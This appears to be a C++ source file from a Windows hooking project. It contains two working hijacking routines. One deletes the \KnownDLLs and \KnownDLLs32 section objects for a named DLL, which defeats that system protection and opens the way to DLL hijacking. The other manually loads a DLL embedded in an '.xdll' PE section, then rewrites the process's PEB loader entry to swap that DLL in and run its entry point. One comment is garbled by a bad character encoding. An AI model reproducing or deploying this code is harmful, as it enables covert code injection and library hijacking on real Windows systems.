#include "stdafx.h"

namespace usr::hijacking
{
	void hijack_knownDlls(std::wstring dllname)
	{
		
		auto del_section = [](LPWSTR section_name)
		{
			auto ntopensection = [](LPWSTR section_name)
			{
				using namespace ntdll;
				HANDLE          section;
				UNICODE_STRING  sectionString;
				OBJECT_ATTRIBUTES attributes;

				RtlInitUnicodeString(&sectionString, section_name);

				InitializeObjectAttributes(&attributes, &sectionString,
					OBJ_CASE_INSENSITIVE, NULL, NULL);
				auto status = ntdll::ZwOpenSection(&section, SECTION_ALL_ACCESS, &attributes);

				if (status<0) {
					DbgPrint("Could not open dll section! 0x%lx\r\n", status);
					return HANDLE(nullptr);
				}

				return section;
			};
			HANDLE hSection = ntopensection(section_name);
			if (hSection)
			{
				ntdll::ZwMakeTemporaryObject(hSection);
				ntdll::ZwClose(hSection);
			}
		};
		WCHAR szSectionNameFull[MAX_PATH] = {};
		WCHAR szSection32NameFull[MAX_PATH] = {};
		wsprintfW(szSectionNameFull, L"\\KnownDLLs\\%ws", dllname.c_str());
		wsprintfW(szSection32NameFull, L"\\KnownDLLs32\\%ws", dllname.c_str());
		del_section(szSection32NameFull);
		del_section(szSectionNameFull);
	}

	void hijack_me(PVOID ImageBase)
	{
		SIZE_T size_ = 0;
		auto pxdll = usr::ldr::tools::get_section_by_name(ImageBase, ".xdll",size_);
		if (pxdll)
		{
			usr::ldr::ldr_module ldrmm;
			auto hdll = ldrmm.load_module(pxdll);
			if (hdll)
			{
				ldrmm.no_release();
				auto nt_header = ntdll::RtlImageNtHeader(hdll);
				//PEB½Ù³Ö¿ªÊ¼
				auto ldr_entry = (ntdll::LDR_DATA_TABLE_ENTRY*)(usr::ldr::tools::get_peb_ldr_by_hmodule(ImageBase));
				if (ldr_entry)
				{
					ldr_entry->DllBase = hdll;
					ldr_entry->SizeOfImage = nt_header->OptionalHeader.SizeOfImage;
					ldr_entry->EntryPoint = PVOID((DWORD_PTR)hdll + nt_header->OptionalHeader.AddressOfEntryPoint);
					typedef BOOL(WINAPI *DllEntryProc)(HINSTANCE, DWORD, LPVOID);
					auto ep = reinterpret_cast<DllEntryProc>(reinterpret_cast<char *>(ldr_entry->EntryPoint));
					ep(reinterpret_cast<HINSTANCE>(hdll), DLL_PROCESS_ATTACH, 0);
				}
			}

		}
	}
}